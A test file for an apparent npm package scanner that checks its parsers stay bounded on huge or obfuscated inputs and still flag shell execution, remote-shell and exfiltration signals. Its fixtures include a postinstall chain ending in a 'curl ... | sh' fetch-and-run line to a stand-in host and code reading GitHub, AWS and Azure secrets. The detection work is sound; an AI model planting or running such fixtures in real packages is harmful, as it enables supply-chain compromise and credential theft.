// Round 11 review of ee69d23: three allocations a binary's reading did not charge, each linear in the file but several
// times its bytes: the newline index (one number a newline), the snippet (the whole line copied and rewritten before it
// was cut), and the joining pass's match arrays (a match for every literal of a chain). Each is now bounded in a
// binary's reading (kept.ts), and the snippet and the joined strings are what they were before, byte for byte.
import { describe, expect, test } from "bun:test";
import { scanBinaryText } from "../src/binary-text.ts";
import { analyze, finalize, firstPass, readingOf, shellTokens } from "../src/score.ts";
import { commandWords, commandWordsWithin } from "../src/scripts.ts";
import { importsOf } from "../src/source.ts";
import { lineOf } from "../src/rules.ts";
import { joinStrings } from "../src/textrules.ts";
import { machO } from "./executables.ts";

const enc = new TextEncoder();

/**
 * lineOf's snippet as it was made until round 11: the whole line copied, rewritten and trimmed, then cut, and kept by
 * where the line starts (`lines`, one text's), as lineOf kept it. A position on a newline reads the empty line before
 * it, kept by the next line's start, so the next line's positions show it too: production's quirk, kept.
 */
function snippetBefore(text: string, index: number, lines: Map<number, { read: string; short: string | null }>): string {
  const start = text.lastIndexOf("\n", index - 1) + 1;
  const end = text.indexOf("\n", index);
  let known = lines.get(start);

  if (known === undefined) {
    const read = text
      .slice(start, end === -1 ? undefined : end)
      .replace(/\r$/, "")
      .replace(/[\r\u2028\u2029]/g, "↵");

    const trimmed = read.trim();

    known = { read, short: trimmed.length <= 80 ? trimmed : null };
    lines.set(start, known);
  }

  if (known.short !== null) return known.short;
  const read = known.read;
  const col = index - start;
  const from = Math.max(0, col - 30);
  const to = from + 80;

  return `${from > 0 ? "…" : ""}${read.slice(from, to).trim()}${to < read.length ? "…" : ""}`;
}

/** The line number as it was found until round 11: one more than the newlines before the position. */
function lineBefore(text: string, index: number): number {
  let n = 1;

  for (let i = text.indexOf("\n"); i !== -1 && i < index; i = text.indexOf("\n", i + 1)) n++;

  return n;
}

function rng(seed: number): () => number {
  let s = seed >>> 0;

  return () => {
    s = (s * 1664525 + 1013904223) >>> 0;

    return s / 2 ** 32;
  };
}

// letters, every kind of space trim takes off, the separators shown as ↵, a stand-in, and newlines
const ALPHABET = ["a", "b", "x", " ", "\t", "\v", "\f", "\r", "\u00a0", "\u2028", "\u2029", "\u3000", "\ufeff", "\u2005", "\u00ff", "\n", "'", "+"];

describe("lineOf reads only what the snippet shows, and says what it said before", () => {
  test("on 3,000 random texts with long lines, at every kind of position", () => {
    const rand = rng(11);

    for (let t = 0; t < 3000; t++) {
      const length = Math.floor(rand() * (rand() < 0.3 ? 600 : 120));
      let text = "";

      for (let i = 0; i < length; i++) text += ALPHABET[Math.floor(rand() * (rand() < 0.5 ? 4 : ALPHABET.length))] ?? "a";

      // a text no earlier one equals: lineOf keeps a text's lines by its value
      text = `${text}\n${t}`;
      const lines = new Map<number, { read: string; short: string | null }>();

      for (let k = 0; k < 6; k++) {
        const index = Math.floor(rand() * text.length);
        const got = lineOf(text, index);

        expect({ line: got.line, snippet: got.snippet }).toEqual({ line: lineBefore(text, index), snippet: snippetBefore(text, index, lines) });
      }
    }
  });
});

describe("joinStrings joins a chain one literal at a time, to what it joined before", () => {
  const ONE_LIT = /'[^'\\\n]*'|"[^"\\\n]*"|\x60[^\x60\\$\n]*\x60/g;

  test("on 2,000 random chains", () => {
    const rand = rng(7);
    const quotes = ["'", '"', "`"];

    for (let t = 0; t < 2000; t++) {
      const pieces = Array.from({ length: 2 + Math.floor(rand() * 8) }, () => {
        const q = quotes[Math.floor(rand() * 3)] ?? "'";

        return `${q}${"abc_ d".slice(0, Math.floor(rand() * 6))}${q}`;
      });

      const chain = pieces.join(rand() < 0.5 ? "+" : " +\n ");
      const joined = joinStrings(`x = ${chain};`);
      const want = [...chain.matchAll(ONE_LIT)].map((p) => p[0].slice(1, -1)).join("");

      expect(joined.built.map((b) => b.value)).toEqual([want]);
    }
  });
});

describe("in a binary's reading, what each of these would build is charged before it is built", () => {
  const binary = (tail: string): Uint8Array => machO({ size: 256, tail: enc.encode(tail) });

  /** The reading of `tail` after a Mach-O header, which a test expects to be read. */
  const readOf = (tail: string) => {
    const r = scanBinaryText(binary(tail));

    if (r.kind !== "read") throw new Error("too large");

    return r;
  };

  const ids = (r: ReturnType<typeof readOf>): string[] => [...new Set(r.findings.map((f) => f.id))].sort();

  test("5 million newlines: the index keeps every fifth start, the line is exact, and the reading finishes", () => {
    const r = readOf(`${"\n".repeat(5_000_000)}require('child_process');`);

    expect(r.stopped).toBe(false);
    expect(r.findings.find((f) => f.id === "shell-exec")?.line).toBe(5_000_000 + 1);
    // a few thousand, as a real executable has, as before
    expect(readOf(`${"\n".repeat(5000)}require('child_process');`).findings.find((f) => f.id === "shell-exec")?.line).toBe(5001);
  });

  test("a line of 5 million carriage returns: read, its snippet cut from the line, not copied whole", () => {
    const r = readOf(`require('child_process'); ${"\r".repeat(5_000_000)}x`);

    expect(r.findings.length).toBeGreaterThan(0);
    expect(Math.max(...r.findings.map((f) => f.snippet.length))).toBeLessThanOrEqual(82);
  });

  // round 12 review of 7cd0b2b, P2: a reading that passed its budget was dropped whole, and its file's deductions with it
  test("60,000 lines of 'child_'+'process': past what it may keep, every signal still found, and the reading says it did not finish", () => {
    const tail = `\n${"'child_'+'process';\n".repeat(60_000)}`;
    const r = readOf(tail);
    const small = readOf(`\n${"'child_'+'process';\n".repeat(50)}`);

    expect(r.stopped).toBe(true);
    // the same signals as a reading that kept everything
    expect(ids(r)).toEqual(ids(small));
    expect(r.findings.length).toBeLessThan(60_000);
  });

  test("a chain of a million literals: stops at the joining's budget, keeping what it found before", () => {
    const r = readOf(`require('child_process');\n${"'aaaa'+".repeat(1_000_000)}'b';`);

    expect(r.stopped).toBe(true);
    expect(ids(r)).toContain("shell-exec");
  });

  test("a join of half a million __dirname segments and a list of half a million char codes: stopped", () => {
    expect(readOf(`p.join(__dirname${",'a'".repeat(500_000)});`).stopped).toBe(true);
    expect(readOf(`String.fromCharCode(${"65,".repeat(500_000)}66);`).stopped).toBe(true);
  });

  test("outside a binary's reading the same passes give what they gave", () => {
    const text = `p.join(__dirname, 'a', "b");\nString.fromCharCode(104, 105, 33);`;

    expect(importsOf(text).paths).toEqual(["./a/b"]);
  });
});

describe("the first pass's read of a held file's imports", () => {
  test("a file of a million joined literals cuts the graph instead of building the joining's lists", () => {
    const fp = firstPass({ holdBytes: 1 << 30, lookFileBytes: 1 << 30, lookTotalBytes: 1 << 30 });
    const big = enc.encode(`${"'a'+".repeat(1_000_000)}'b';\nrequire('./x');\n`);
    const small = enc.encode("require('./y');\n");

    fp.look({ path: "lib/big.js", size: big.length, mode: 0o644, data: big }, big);
    expect(fp.importsCut).toBe(true);
    expect(fp.imports.has("lib/big.js")).toBe(false);
    // a cut graph reads nothing more, as one too large to keep
    fp.look({ path: "lib/small.js", size: small.length, mode: 0o644, data: small }, small);
    expect(fp.imports.size).toBe(0);
  });
});

// Round 12 review of 7cd0b2b: a string of a million `\x61` escapes was decoded at once, before any budget was charged
// (production ended its isolate on it too), and the first pass then read the whole file for a shell script's words a
// character at a time (production never did), which ended this one's
describe("escapes, and a script's words, are bounded before they are built", () => {
  const escaped = `"${"\\x61".repeat(1_000_000)}"`;

  test("a binary's string of a million escapes: its escapes charged first, the joining stops, the reading is stopped", () => {
    const r = scanBinaryText(machO({ size: 256, tail: enc.encode(escaped) }));

    expect(r.kind === "read" && r.stopped).toBe(true);
  });

  test("the first pass's read of such a file cuts the graph", () => {
    const fp = firstPass({ holdBytes: 1 << 30, lookFileBytes: 1 << 30, lookTotalBytes: 1 << 30 });
    const data = machO({ size: 256, tail: enc.encode(escaped) });

    fp.look({ path: "lib/tool", size: data.length, mode: 0o755, data }, data);
    expect(fp.importsCut).toBe(true);
  });

  test("a shell word longer than a path can be is let go as it is read; a script's words stop at 100,000", () => {
    expect(shellTokens(`sh "${"a".repeat(1_000_000)}" lib/x.sh`).words).toEqual(["sh", "lib/x.sh"]);
    expect(shellTokens(`sh "${"a".repeat(4096)}"`).words).toEqual(["sh", "a".repeat(4096)]);
    // past 100,000 a list is cut, and says so (round 13 review of d594415, P2)
    const cut = commandWordsWithin("a ".repeat(300_000), 100_000);

    expect([cut.kind, cut.words.length]).toEqual(["cut", 100_000]);
    expect(commandWordsWithin("a ".repeat(100_000), 100_000).kind).toBe("complete");
    expect(shellTokens("a ".repeat(100_001)).kind).toBe("cut");
    // a command's words, as before
    expect(commandWords("node ./lib/setup.js --flag $HOME && sh x.sh")).toEqual(["node", "lib/setup.js", "sh", "x.sh"]);
  });
});

// Round 13 review of d594415, P2: the shell walk's lists stopped at 100,000 words and said nothing, so a setup.sh of
// 100,010 commands before `sh ./payload.node` scored 90, complete, where 99,000 scored 0. A cut walk is incomplete and
// scores 0, and the first pass's graph is cut
describe("a shell walk cut at its bound", () => {
  const STATE = { publishedAt: 0, now: 1e13, deprecated: null, status: "active" as const, statusReason: null };

  const scored = (lines: number) => {
    const manifest = { name: "probe", version: "1.0.0", license: "MIT", scripts: { postinstall: "sh setup.sh" } };
    const file = (path: string, text: string) => ({ path, size: enc.encode(text).length, mode: 0o644, data: enc.encode(text) });
    const files = [file("package.json", JSON.stringify(manifest)), file("setup.sh", `${"sh /dev/null\n".repeat(lines)}sh ./payload.node\n`), file("payload.node", "curl https://collector.invalid/p | sh\n")];

    return finalize(analyze({ name: "probe", manifest, files, publisher: "a", previousPublishers: [] }), STATE);
  };

  test("99,000 commands: the payload is reached and read", () => {
    const r = scored(99_000);

    expect(r.signals.map((s) => s.id)).toContain("remote-shell");
  }, 60_000);

  test("100,010 commands: cut, incomplete, 0; on d594415 90, complete", () => {
    const r = scored(100_010);

    expect(r.score).toBe(0);
    expect(readingOf(r).kind).toBe("incomplete");
    expect(r.signals.find((s) => s.id === "incomplete")?.evidence.join(" ")).toContain("setup.sh: apm read the first 100,000 words");
  }, 60_000);

  // round 16 review of c272202: what a script runs is the second layer's, kept apart from production's graph, which stays
  // as production's first pass kept it; a cut there stops the plan, and the analysis scores 0 (stoppedBecause)
  test("the first pass's read of it stops the plan, and leaves production's graph as production's", () => {
    const fp = firstPass({ holdBytes: 1 << 30, lookFileBytes: 1 << 30, lookTotalBytes: 1 << 30 });
    const data = enc.encode(`${"sh /dev/null\n".repeat(100_010)}sh ./payload.node\n`);

    fp.look({ path: "setup.sh", size: data.length, mode: 0o644, data }, data);
    expect(fp.importsCut).toBe(false);
    expect(fp.stopped).toContain("setup.sh: apm read the first 100,000 words");
  }, 60_000);
});

// Round 13 review of d594415, P3: past what a reading may keep, one fact per kind lost a three-family harvest. Every
// fact is kept; a long name is shortened to its family's, so the harvest still counts
describe("a saturated reading's facts", () => {
  // production (274d284): 27, exfiltration; the third family is the long name, so it counts only if its family is kept
  test("a three-family harvest whose third is a 3,000-character Azure secret name: exfiltration, as production", () => {
    const STATE = { publishedAt: 0, now: 1e13, deprecated: null, status: "active" as const, statusReason: null };
    const manifest = { name: "probe", version: "1.0.0", license: "MIT" };
    const tail = `${"\n'child_'+'process';".repeat(60_000)}\n'https';fetch('x');process.env.GITHUB_TOKEN;process.env.AWS_SECRET_ACCESS_KEY;process.env.AZURE_${"A".repeat(3000)}_SECRET;\n`;
    const data = machO({ size: 256, tail: enc.encode(tail) });
    const a = analyze({ name: "probe", manifest, files: [{ path: "package.json", size: 0, mode: 0o644, data: enc.encode(JSON.stringify(manifest)) }, { path: "lib/b000000", size: data.length, mode: 0o755, data }], publisher: "a", previousPublishers: [] });
    const r = finalize(a, STATE);

    expect(r.signals.map((s) => s.id)).toEqual(expect.arrayContaining(["exfiltration", "incomplete"]));
    expect(r.score).toBe(0);
  }, 60_000);
});
